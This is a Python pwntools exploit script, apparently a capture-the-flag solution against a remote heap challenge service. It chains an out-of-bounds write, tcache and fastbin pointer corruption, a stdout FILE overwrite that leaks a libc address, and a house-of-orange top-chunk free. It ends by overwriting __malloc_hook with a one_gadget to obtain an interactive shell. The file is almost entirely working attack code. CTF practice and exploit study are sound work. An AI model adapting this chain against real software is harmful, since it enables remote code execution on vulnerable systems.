#!/usr/bin/python
from pwn import *
import sys

HOST = "halleb3rry-01.pwn.beer"
PORT = 6666

def alloc(size, content):
	r.sendline("1")
	r.sendlineafter("size: ", str(size))
	r.sendafter("data: ", content)
	r.recvuntil("> ")

def delete():
	r.sendline("3")
	r.recvuntil("> ")

def edit(idx, value):
	r.sendline("2")
	r.sendlineafter("index: ", str(idx))
	r.sendlineafter("byte: ", str(value))
	r.recvuntil("> ")	

def write_off(off, payload):
	for i in range(len(payload)):
		edit(off+i, ord(payload[i]))

def exploit(r):
	r.sendafter("name: ", "A"*128)

	log.info("Create fake chunk and free it to get main_arena ptr on heap")

	# Setup two chunks on the heap (both freed)
	alloc(0x60-8, "A"*(0x60-8))
	delete()
	alloc(0x70-8, "A"*(0x70-8))
	delete()

	# Reallocate first chunk
	alloc(0x60-8, "\x00")
	
	# Use oob write to overwrite size of next chunk
	edit(0x60-8, 0x01)
	edit(0x60-8+1, 0x5)

	# Use oob write to write some valid next_sizes on heap
	edit(0x60-8+0x500, 0x71)
	edit(0x60-8+0x500+0x70, 0x71)

	# Free chunk with fake size, so tcache won't be used
	alloc(0x70-8, "A"*8)
	delete()

	log.info("Setup some chunks and overwrite freed FD pointing to stdout pointer")

	# Allocate two aligned chunks (both in tcache bin list)
	alloc(0x60-8, "A"*(0x60-8))
	delete()
	alloc(0x70-8, "C"*(0x70-8))
	delete()

	# Allocate first chunk again
	alloc(0x60-8, "Y"*(0x60-8))

	# Overwrite FD of following chunk with pointer to stdout	
	write_off(0x60, p64(0x602040))

	# Allocate chunk to get stdout pointer into fastbin list
	alloc(0x70-8, "X"*10)
	
	log.info("Allocate chunk to get stderr pointer into bin list")
	alloc(0x70-8, "\n")

	log.info("Allocate chunk inside stderr")
	alloc(0x70-8, "\n")

	log.info("Overwrite _IO_write_ptr")

	r.sendline("2")
	r.sendlineafter("index: ", str(0x109))	
	r.sendlineafter("byte: ", str(0xf0))
	
	r.recvuntil("CCC\x00\x31")
	r.recv(7)
	LIBCLEAK = u64(r.recv(8))
	libc.address = LIBCLEAK - 96 - 0x10 - libc.symbols["__malloc_hook"]
	r.recvuntil("> ")

	log.info("LIBC leak : %s" % hex(LIBCLEAK))
	log.info("LIBC      : %s" % hex(libc.address))

	log.info("Trigger free via house of orange")

	for i in range(29):
		alloc(128, "A")
	
	# Overwrite top
	write_off(0x88, p64(0x71))
	
	# Allocate to trigger free of top chunk
	alloc(128, "A")

	log.info("Trigger second free")
	for i in range(27):
		alloc(128, "A")

	# Overwrite top
	write_off(0x88, p64(0x41))

	# Allocate to trigger free of top chunk
	alloc(128, "A")

	log.info("Get previous free chunk")	
	alloc(0x50-8, "A")

	log.info("Overwrite FD of second chunk with __malloc_hook")
	payload = p64(libc.symbols["__malloc_hook"])

	write_off(0x20030, payload)

	log.info("Allocate chunks to overwrite __malloc_hook with one_gadget")
	alloc(0x20-8, "A")
	alloc(0x20-8, p64(libc.address+0x4f322))

	log.info("Allocate another chunk to trigger one_gadget")
	r.sendline("1")
	r.sendline("100")

	r.interactive()

	return

if __name__ == "__main__":
	libc = ELF("./libc.so.6")
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		#r = process("./pwn", env={"LD_PRELOAD":"./libc.so.6"})
		r = remote("localhost", 6666)
		print util.proc.pidof(r)
		pause()
		exploit(r)
